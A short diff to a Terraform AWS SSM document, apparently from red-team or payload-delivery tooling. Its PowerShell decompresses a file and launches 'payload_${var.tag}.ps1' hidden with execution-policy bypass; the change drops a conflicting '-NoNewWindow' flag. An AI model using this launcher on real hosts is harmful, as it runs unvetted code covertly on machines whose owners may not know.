@@ -64,7 +64,7 @@ resource "aws_ssm_document" "this" {
                             "$decompressedFile = [System.IO.File]::Create($outputDecompressedPath)",
                             "$gzipStream.CopyTo($decompressedFile)",
                             "Write-Output \"Decompression successful! Decompressed file saved to $outputDecompressedPath\"",
-                            "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"$env:TEMP\\payload_${var.tag}.ps1\"' -NoNewWindow -WindowStyle Hidden",
+                            "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"$env:TEMP\\payload_${var.tag}.ps1\"' -WindowStyle Hidden",
                         "} catch {",
                             "Write-Error \"Failed to decompress the file: $_\"",
                         "} finally {",
